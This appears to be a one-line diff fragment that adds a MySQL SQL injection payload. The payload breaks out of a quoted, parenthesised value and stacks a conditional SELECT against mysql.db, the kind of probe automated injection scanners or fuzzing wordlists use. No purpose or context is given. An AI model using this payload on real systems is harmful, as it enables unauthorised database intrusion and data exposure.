@@ -1,0 +1,1 @@
+1'));select (case when (8601=1220) then 8601 else 8601*(select 8601 from mysql.db) end)#
